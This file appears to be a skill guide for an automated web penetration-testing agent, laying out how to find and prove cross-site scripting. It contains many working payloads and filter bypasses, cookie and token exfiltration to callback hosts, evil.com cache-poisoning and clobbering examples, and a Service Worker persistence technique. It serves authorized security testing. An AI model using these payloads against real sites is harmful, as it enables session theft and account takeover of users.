---
name: Cross-Site Scripting (XSS) Testing
description: Find reflected, stored, and DOM XSS across parameters and inputs, and confirm with a payload that actually executes script in the victim's browser.
tags: [web, xss, owasp-a03]
recommended_tools: [dalfox_xss_scan, xsser_scan, arjun_parameter_discovery, http_repeater, http_request]
vuln_classes: [xss]
domain: web
phase: exploitation
---
# Cross-Site Scripting (XSS) Testing

XSS runs attacker-controlled JavaScript in another user's session. The bar for a finding is **execution**, not reflection: a reflected `<script>` that the browser does not run (escaped, wrong context, CSP-blocked) is *not* XSS. The verifier wants a concrete PoC where script fires.

## Where to look
Every reflected and stored sink: `search=`, `q=`, error/`msg=` parameters, `Referer`/`User-Agent` reflected into pages, profile bio / display name, comments, support tickets, file metadata (EXIF, SVG, filenames), JSON APIs echoed into HTML, `redirect`/`next` values, and anything written to the DOM by client JS. Use `arjun_parameter_discovery` to surface hidden reflected params before testing.

## Detection -> confirmation -> escalation ladder
1. **Reflection probe.** Inject a unique, harmless marker `riptidexss123<>"'/` and locate every reflection. Note the **exact context**: HTML body, tag attribute (quoted/unquoted), inside `<script>`, inside a URL/`href`, HTML comment, or CSS. Which of `< > " ' /` survive un-encoded decides everything.
2. **Context-specific break-out** in `http_repeater` / `http_request`:
   - HTML body: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`
   - Quoted attribute: `" onmouseover=alert(1) x="` or close the tag: `"><svg onload=alert(1)>`
   - Unquoted attribute: ` onfocus=alert(1) autofocus `
   - Inside `<script>` string: `';alert(1);//` or `</script><svg onload=alert(1)>`
   - URL/`href` sink: `javascript:alert(1)`
3. **Confirm execution.** A reflection is only proven when the JS actually runs. Use an execution-evidencing payload, not a bare `alert`: `<img src=x onerror="fetch('//OAST/?c='+document.domain)">`. A token-correlated OAST hit (or a DOM mutation the verifier can read) is deterministic proof. `dalfox_xss_scan` returns a working PoC URL — capture that URL as the payload.
4. **Stored XSS.** Submit the payload, then load the *rendering* page (different page/user view). Proof = script firing on that second page, ideally with an OAST callback carrying `document.cookie`/`document.domain`.
5. **DOM XSS.** Trace source -> sink in client JS. Sources: `location.hash`, `location.search`, `document.referrer`, `postMessage` event data, `window.name`. Sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(str)`, `location=`, `el.src`. PoC: `#<img src=x onerror=alert(document.domain)>` on a `location.hash -> innerHTML` flow.
6. **Escalate.** Reflected -> stored variant -> cookie/token theft -> account takeover. If `HttpOnly` blocks cookie reads, exfil the CSRF token / DOM secrets or perform an authenticated action via `fetch()` from the victim context.

## Bypass variants (filters / WAF / parsers)
- **Case / structure:** `<sCrIpt>`, `<svg/onload=alert(1)>`, `<svg onload=alert(1)//`, backtick/newline-split attributes.
- **No `<script>` allowed:** event handlers on any tag — `<details open ontoggle=alert(1)>`, `<body onpageshow=alert(1)>`, `<input autofocus onfocus=alert(1)>`.
- **Encoding:** HTML entities (`&#x61;lert`), URL/double-URL encoding, JS unicode `A`, `eval(atob('YWxlcnQoMSk='))`, `eval(String.fromCharCode(97,108,101,114,116,40,49,41))`.
- **mXSS (parser mutation):** `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` and `<svg><a><animate attributeName=href values=javascript:alert(1)>` — innerHTML re-parse resurrects the tag.
- **Template injection / framework:** Angular `{{constructor.constructor('alert(1)')()}}` (treat as SSTI-adjacent; client-side template sink).
- **postMessage XSS:** if a listener writes `e.data` to `innerHTML` without checking `e.origin`, host an attacker page that frames the victim and `postMessage`s `<img src=x onerror=fetch("//OAST/?c="+document.cookie)>`.
- **CSP:** look for `unsafe-inline`, wildcard/`object-src` gaps, JSONP endpoints, or whitelisted CDNs hosting usable gadgets. A payload blocked by CSP is not a confirmed finding.

## Exact proof to capture
The injected **parameter/field**, the **reflection context**, and the **exact payload** that *executes* — proven by an OAST callback (token-correlated, carrying `document.domain`/cookie) or an observable DOM/`alert` execution, plus the PoC URL/request. Reflection without execution is downgraded to info, not XSS.

## Tooling
- `dalfox_xss_scan url=https://t/?q=FUZZ` — context-aware scan; emits a firing PoC URL. Add `--custom-payload`, `--blind https://OAST` for stored/blind, `--cookie 'session=...'` for authed pages.
- `xsser_scan` for an alternate engine / heavier mutation set when dalfox misses encoded contexts.
- `arjun_parameter_discovery -u https://t/page` to find reflected params first.
- Manual `http_request`: send `GET /?q=<svg onload=alert(1)> HTTP/1.1` and read the raw body to confirm whether `<`/`"` are encoded before deciding the payload.

## Chaining
DOM XSS via `postMessage` + missing `HttpOnly` -> session theft -> ATO. Stored XSS in an admin-viewed field -> CSRF-token exfil -> privileged action. Combine with CORS misconfig to read cross-origin responses from the victim context.

## Safety / CWE
Use a benign marker and a self-contained OAST callback; never inject worm-like or cookie-mass-mailing payloads, and clean up stored test artifacts. CWE-79.


<!-- Ingested from reference frameworks (skill-ingestion) -->
## Context-matched breakout selection (detect context first)
Classify the injection context, then pick the breakout for THAT context — wrong-context payloads waste budget.
```
HTML_BODY:        <img src=x onerror=alert(1)>   <svg onload=alert(1)>   <details open ontoggle=alert(1)>
HTML_ATTRIBUTE:   " onfocus=alert(1) autofocus "    " onmouseover=alert(1) x="
JS_STRING:        ';alert(1);//      ' onmouseover='alert(1)
TEMPLATE_LITERAL: ${alert(1)}
URL:              javascript:alert(1)
filter-evasion:   %3Cscript%3Ealert(1)%3C/script%3E    <script>
mXSS:             <noscript><p title="</noscript><img src=x onerror=alert(1)>">
```
Key rule: HTML-entity-encoding inside a JS_STRING context is NOT a fix — you must break the JS string. `Reflected in HTML != JavaScript executed`.

## Unique-canary reflection oracle (deterministic, pre-execution)
Inject a non-HTML-meaningful token in angle brackets into common params (q, search, query, s, term, name, id). Confirm ONLY if the raw `<` survives.
```
<ptaiRX9173>      (reflected)        <ptaiSX9173>   (stored: POST then GET read-back)
```
Proof signal: raw `<ptaiRX9173>` present unescaped in body. If the response contains the escaped form `<ptaiRX9173>`, that is a NEGATIVE result (safely encoded). This proves an XSS-capable sink before proving execution.

## Blind XSS for unobservable stored sinks
For support tickets, logs, admin profiles, contact forms — use a base64 callback payload pointing at interactsh.
```
<script src=//{OAST}></script>
"><script>fetch('https://{OAST}/'+document.cookie)</script>
```
Proof signal: interactsh receives the blind-XSS callback with `document.cookie`/`document.domain` when an admin views the stored sink. For directly observable sinks, require `alert()`/`console.log` firing in a real browser (Playwright) — Level 3 EXPLOITED. Tooling: `dalfox url <target> --mining-dom --mining-dict --blind --custom-payload 'alert(document.domain)'`.

## Modern techniques & real-world CVEs (via recon-skills)

Net-new material distilled from 174 disclosed XSS reports plus PortSwigger/Bentkowski/d0nut DOM research. Skips context ladders, mXSS combos, and OAST gating already covered above.

### Framework auto-escape reality check (sink-first triage)
Modern JS frameworks escape text by default — reflection of `<` is almost always a false positive unless the field reaches a raw-HTML sink. Determine the framework, then only chase XSS if the specific dangerous sink exists:

| Framework | Escapes by default | XSS only via |
|-----------|-------------------|--------------|
| React/JSX | all text | `dangerouslySetInnerHTML`, `innerHTML` on refs |
| Vue | `{{ }}` | `v-html` |
| Angular | `{{ }}` | `[innerHTML]` binding |
| Svelte | `{ }` | `{@html}` |
| Next.js RSC | JSX text | `dangerouslySetInnerHTML` in components |

React/JSX auto-escaping alone kills ~90% of apparent XSS. Grep the JS bundles for the sink before claiming exploitability:
```bash
grep -rPn 'dangerouslySetInnerHTML|innerHTML|outerHTML|v-html|\[innerHTML\]|\{@html\}|insertAdjacentHTML|document\.write\(|eval\(' /tmp/target_js/
# If no sink appears near the reflected field -> LOW: HTML storage without exploitable sink, not XSS.
```

### jQuery htmlPrefilter self-closing-tag XSS (CVE-2020-11022 / CVE-2020-11023)
jQuery < 3.5.0 mutates attacker HTML passed to `.html()`/`.append()`/`.after()` into executing markup — one of the most common real-world DOM-XSS roots. Grep the bundled version, then confirm:
```html
<style><style /><img src=x onerror=alert(document.domain)>
```

### Sanitizer patch-bypass class (incomplete-fix hunting)
Sanitizer fixes are frequently incomplete — retest patched endpoints with slight variations. CVE-2022-32209 (Rails `rails-html-sanitizer`) shipped an incomplete fix that stayed bypassable. When a field was "fixed", probe allowlist edge combinations rather than assuming closed:
```html
<math><style><img src=x onerror=alert(1)></style></math>
<svg><style><img src=x onerror=alert(1)></style></svg>
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
```

### Markdown / diagram-renderer sinks
Third-party render pipelines (Banzai, Kramdown, RDoc, Kroki/Mermaid/PlantUML) inject XSS when the diagram engine is unsandboxed and output is not re-sanitized. High-value on GitLab/GitHub-class wikis and issue trackers:
```markdown
[Click me](javascript:alert(document.domain))
```
```
```kroki
plantuml
@startuml
:<script>alert(1)</script>;
@enduml
```
```
Also probe Rails-specific roots: `html_safe`/`raw` on partially-sanitized data, and the `translate`/`t()` helper which marks locale strings HTML-safe and interpolates user input.

### Cache-poisoning: reflected -> stored-equivalent at CDN scale
If a reflected sink lands in a cacheable response (`Cache-Control: public, max-age=...`) and an unkeyed input influences the body (`X-Forwarded-Host`, `X-Original-URL`, unkeyed cookie, or a param stripped from the cache key), one poisoning request serves the payload to every edge visitor for the full TTL — no per-victim interaction. Real shape: Glassdoor reflected->stored via cache poisoning (H1 #1424094, 2021-2022); Kettle "Practical Web Cache Poisoning".
```bash
curl -sk "https://target/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.com"
curl -sk "https://target/page" | grep -i "evil.com"   # served from cache to a clean session
```

### DOM Clobbering (markup-only injection, no script)
Where `<script>` is stripped but named/id'd markup passes, HTML injection overwrites a JS global that later feeds a sink (`location`, `script.src`, `innerHTML`, `eval`). Built-in methods like `getElementById` cannot be shadowed this way; a non-built-in global that reaches a sink can:
```html
<a id="config" href="https://evil.com">
<a id="x"></a><a id="x" name="y" href="https://evil.com">   <!-- x.y -> href via anchor toString() -->
<form id="a"><input id="b" name="c" value="clobbered"></form>   <!-- window.a.b.c -->
<base href="https://evil.com/">   <!-- bends every relative src/href -->
```
Provenance: Gareth Heyes / PortSwigger DOM-Invader clobbering scanner; Michał Bentkowski DOMPurify clobbering & mXSS bypasses. Only report when the clobbered value is proven to reach a sink.

### postMessage sender leak & weak-origin bypass
Beyond a listener writing `e.data` to a sink: a *sender* that broadcasts secrets with `targetOrigin '*'` lets any framing page read tokens/auth codes with no XSS at all. And a *weak* origin check (`indexOf('target.com')`, `endsWith('target.com')`, loose regex) is bypassable from a look-alike host (`target.com.evil.com`, `eviltarget.com`) — confirm by serving the PoC from such a host.
```bash
grep -rnE "postMessage\([^,]+,\s*['\"]\*['\"]\)" recon/ --include="*.js"    # senders leaking with '*'
grep -rnE "addEventListener\(\s*['\"]message['\"]" recon/ --include="*.js" | grep -vE "\.origin\b"
```

### Service Worker abuse -> persistent credential intercept (Critical)
Hard rule: a SW script URL **must be same-origin** — a cross-origin script throws `SecurityError`, and `Service-Worker-Allowed` widens *scope*, not script origin. Realistic path: land a JS-serving file on the target origin (upload returning `text/javascript`, a reflected/open-redirect route, JSONP), then register from same-origin XSS to intercept every in-scope `fetch` + auth headers. Survives tab close -> persistent ATO.
```javascript
navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'})
  .then(r => fetch('https://OAST/sw-registered?scope=' + r.scope))
  .catch(e => console.log('SW reg failed', e.name));  // SecurityError => wrong origin/scope
// evil-sw.js (served from TARGET origin): intercept fetch, exfil url + authorization header to OAST.
```
Prove persistence: close all tabs, reopen the origin, show a fresh OAST hit with no XSS re-trigger.

### CSS injection / exfiltration (no JS)
Where attacker CSS is reflected (custom-theme field, `style=` passthrough, email-template editor), attribute-value selectors leak hidden CSRF tokens / API keys / nonces char-by-char to an OAST host with zero JavaScript — d0nut CSS-exfil research, using sequential `@import` recursion to drop the one-char-per-static-input limit:
```css
input[name="csrf"][value^="a"] { background: url(https://OAST/c?p=0&c=a); }
meta[name="csrf-token"][content^="a"] { background: url(https://OAST/c?m=a); }
```
Scope caveat: CSS exfil bypasses CSP that blocks *script*, but NOT a CSP whose `img-src`/`style-src`/`connect-src`/`default-src` restricts external origins. Read the live CSP first — if `img-src 'self'`, `url(https://OAST/...)` is blocked and the technique is dead. Proof = one OAST hit per correct character forming the real token, then use it in a state-changing CSRF request.

### WAF/CSP evasion additions
```html
<video src=x onerror=alert(1)>        <!-- HTML5 media handlers WAFs miss -->
<audio src=x onerror=alert(1)>
<svg onload=eval(atob('YWxlcnQoMSk='))>
<script>alert(1)</script>        <!-- unicode escape in identifier -->
```
CSP bypass gadgets: `<base>` tag injection to redirect script sources; `<link rel=preload>` / `<meta http-equiv>` gadgets; JSONP on allowlisted CDNs (`*.googleapis.com`). Redirect-scheme evasion: `?next=javascript://%0aalert(1)`, `?next=javascript&colon;alert(1)`.

### Disclosed chains worth citing
- DOM XSS on `/oauth/callback` reading `location.hash` -> implicit-flow `#access_token` exfil -> cross-platform ATO. Detectify "Dirty Dancing" OAuth token leakage (F. Rosén, 2022); Zoom OAuth chained ATO $15k (H1, 2024).
- Self-XSS in profile field + CSRF that mutates that field -> effective stored XSS -> ATO (self-XSS that "doesn't pay" becomes Critical).
- SVG upload served same-origin -> executes JS with full session-cookie access, bypassing CSP that only covers HTML responses.

CWE-79 (reflected/stored), CWE-79/CWE-116 (DOM), CWE-1275 (SameSite chain enablers).
